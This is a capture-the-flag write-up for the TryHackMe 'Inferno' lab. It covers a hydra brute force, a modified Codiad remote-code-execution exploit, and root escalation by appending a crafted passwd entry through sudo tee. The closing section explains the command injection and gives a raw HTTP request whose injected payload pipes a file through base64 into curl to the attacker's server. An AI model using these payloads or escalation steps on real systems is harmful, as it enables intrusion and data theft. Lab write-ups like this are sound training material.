# Inferno

https://tryhackme.com/room/inferno

"Real Life machine vs CTF. The machine is designed to be real-life and is perfect for newbies starting out in penetration testing" <- *not too sure about this.*

Enum for this machine was frustrating, as there were dozens of ports open. In fact, I usually use `nmap -sS -sV -vv` for recon but it took over an hour here to scan the whole box. Much better to use rustscan, which on the tryhackme machine can be run with docker as so:

  `docker run -it --rm --name rustscan rustscan/rustscan:latest -a 10.10.36.88 -- -sV`
  
In any event, only the two standard ports were actually open, 22 and 80. On 80 was a simple website with a quote from dante's inferno, and with a bit of enum via `gobuster`, a sub directory `/inferno` that was protected by basic auth.

No further enumeration returned anything else, not even a username - typically I don't like to randomly brute force username's AND passwords, but that was the next step here. Long story short, going with a short list of usernames or just random guessing might get you to running `hydra` like:

  `hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.105.168 -m /inferno http-get`
  
Which eventually revealed the password for admin.

On `/inferno` was an installation of a web ide called 'Codiad'. It showed a file directory under inferno, the tool itself. However, no paths were writable: even though Codiad supports creating or uploading files, trying to do so would fail.

The tool itself is out of support, and there are some CVEs against it unresolved. A quick DDG found https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit, but it wouldn't work as is - the tool was not setup to support basic auth.

In order to get it functioning, I modded the `exploit.py` file so whenever it used session.get or session.post, it would specify basic auth headers. E.g.:

  ```python
  response = session.post(url, data=data, verify=False)
  ```
  
  Became
  
  ```python
  headers = {
    "Authorization": "Basic etcetc"
  }
  response = session.post(url, data=data, headers=headers, verify=False)
  ```
 
Once I got a shell, I noted that it would periodically close, probably due to a cronjob somewhere. It looked like every minute. I was able to work with this however.

> **NOTE**: I go into detail on how this exploit works and alternatives at the end.

In the home directory was dante's folder, with the local.txt file being unreadable. I ran a `ls -laR` which found, under `/Downloads`, a `.download.dat`. In very CTF fashion (not real life pentest at all) this contained hexadecimal characters which I ran through cyberchef to reveal `dante`'s password.

At this point I dropped the exploit shell and just ssh'd in, getting the first flag.

Getting to root was easy: `sudo -l` revealed the user could run `/usr/bin/tee` as root without a password (even though I had the password). Tee sends its input to two outputs, and can both write and append. Being able to use it as root means I could use it to append to the `passwd` file, and I used a handy entry I keep around for just such an occasion which I put into a file called pass: `cat pass | sudo /usr/bin/tee -a /etc/passwd` with pass containing: `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash` (which has password `pass123`).

Once done, I just `su user3` with `pass123` to escalate to root. The final proof.txt was in /root. Easy.

## The codiad exploit.

If you're not a fan of scripts from random github repos, or want to exploit this yourself, heres how. Its actually not too hard, based on a blatant RCE, so you could get that `.download.dat` purely with something like burp, if you wished.

The vulnerable code is in the filemanager class, which you can browse via the codiad interface, specifically the files `/components/filemanager/controller.php` and `/components/filemanager/class.filemanager.php`. The first takes the action as a query parameter then uses the appropriate method from the second, in this case the search function.

The vulnerability is on line 243 of the filemanager class, within the search function:

  `$output = shell_exec('find -L ' . $this->path . ' -iregex  ".*' . $this->search_file_type  . '" -type f | xargs grep -i -I -n -R -H "' . $input . '"');`

Here, search filetype is one of the body parameters, along with the search term, and you can see its being concatted to a os command without escaping. So its basic command injection.

To exploit this is a bit tricky, since its blind: you can't get the response back through the call, at least as far as I could tell. Instead, you can use a trick: fire up a webserver on an accessible machine, e.g, via `python3 -m http.server 4444`.

Then, you can exfiltrate data, by passing a command like `cat /home/dante/Downloads/.download.dat | base64 -w0 | xargs -I T curl 10.10.126.249:4444/?x=T`, which will read that download.dat file, base 64 encode it, then pass it to a curl request to your webserver (where you will see the request arrive with a big payload in the querystring).

I've used this technique before to enumerate a machine, as a wonky remote shell. Via this you could run `ls -laR` to find download.dat, download and run msfvenom packages, examine running processes etc - anything you can encode and xarg into curl and pass into that http body without breaking the request format.

So, back to the vulnerable component: to call this, and do the above, here is the raw http request. Its basically a post to that controller endpoint, with the basic auth header, the codiad cookie (so you will need to log in at least once), and the (unencoded!) body:

```http
POST /inferno/components/filemanager/controller.php?type=1&action=search&path=/var/www/html/inferno HTTP/1.1
Host: 10.10.71.248
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization: Basic {username:password in base64}
Cookie: 99300f2078c94e495d72b82a732ea6db=gu0fv4ear8rsifistrnrcnes1o
Content-Length: 140

search_string=Hacker&search_file_type="%0Acat /home/dante/Downloads/.download.dat | base64 -w0 | xargs -I T curl 10.10.126.249:4444/?x=T %23
```
